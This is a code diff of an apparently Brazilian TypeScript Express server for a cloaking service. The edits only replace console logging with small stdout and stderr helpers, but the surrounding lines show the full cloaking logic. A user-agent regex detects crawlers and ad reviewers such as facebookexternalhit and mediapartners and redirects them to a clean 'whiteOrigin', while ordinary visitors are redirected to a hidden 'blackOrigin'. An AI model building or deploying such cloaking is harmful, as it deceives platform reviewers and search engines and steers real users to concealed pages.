@@ -8,6 +8,14 @@ const app = express();
 const PORT = process.env.PORT || 8080;
 const API_URL = process.env.API_URL || "https://api.cloakerguard.com.br";
 
+// Funções de log seguras (stdout/stderr direto)
+function log(...args: any[]) {
+  process.stdout.write(args.map(String).join(" ") + "\n");
+}
+function error(...args: any[]) {
+  process.stderr.write(args.map(String).join(" ") + "\n");
+}
+
 function normalizeHost(raw = "") {
   return raw.split(",")[0].trim().toLowerCase().replace(/:\d+$/, "");
 }
@@ -37,8 +45,8 @@ app.use(async (req: any, res) => {
 
     const ua = req.headers["user-agent"]?.toLowerCase() || "";
 
-    console.log("[EDGE] Requisição recebida para host:", host);
-    console.log("[DEBUG UA]", ua || "(sem UA)");
+    log("[EDGE] Requisição recebida para host:", host);
+    log("[DEBUG UA]", ua || "(sem UA)");
 
     // chamada para API central
     const resp = await axios.get(`${API_URL}/domains/resolve`, {
@@ -49,44 +57,44 @@ app.use(async (req: any, res) => {
     const data = resp.data;
 
     // regra de bot
-    const isBot = /bot|crawl|slurp|spider|mediapartners|facebookexternalhit|headlesschrome|curl/i.test(
-      ua
-    );
+    const isBot =
+      /bot|crawl|slurp|spider|mediapartners|facebookexternalhit|headlesschrome|curl/i.test(
+        ua
+      );
 
-    console.log("[DEBUG ISBOT]", isBot);
+    log("[DEBUG ISBOT]", isBot);
 
     let target: string | null = null;
 
     if (isBot) {
       target = normalizeTarget(data.whiteOrigin);
-      console.log("[EDGE] Bot detectado → enviando para whiteOrigin");
+      log("[EDGE] Bot detectado → enviando para whiteOrigin");
     } else {
       target = normalizeTarget(data.blackOrigin);
-      console.log("[EDGE] Usuário normal → enviando para blackOrigin");
+      log("[EDGE] Usuário normal → enviando para blackOrigin");
     }
 
     // fallback caso esteja vazio
     if (!target) {
       target = normalizeTarget(data.blackOrigin || data.whiteOrigin);
-      console.warn("[EDGE] Fallback acionado → target:", target);
+      log("[EDGE] Fallback acionado → target:", target);
     }
 
     if (!target) {
-      console.error("[EDGE] Nenhum destino configurado para host:", host, "data:", data);
+      error("[EDGE] Nenhum destino configurado para host:", host, "data:", data);
       return res.status(500).send("Nenhum destino configurado");
     }
 
-    console.log(`[EDGE] Redirecionando ${host} -> ${target}`);
+    log(`[EDGE] Redirecionando ${host} -> ${target}`);
 
     res.setHeader("Cache-Control", "no-store");
     return res.redirect(302, target);
-
   } catch (err: any) {
-    console.error("[EDGE] Erro:", err.message);
+    error("[EDGE] Erro:", err.message);
     return res.status(500).send("Internal proxy error");
   }
 });
 
 app.listen(PORT, () => {
-  console.log(`🌍 Edge rodando na porta ${PORT}`);
+  log(`🌍 Edge rodando na porta ${PORT}`);
 });
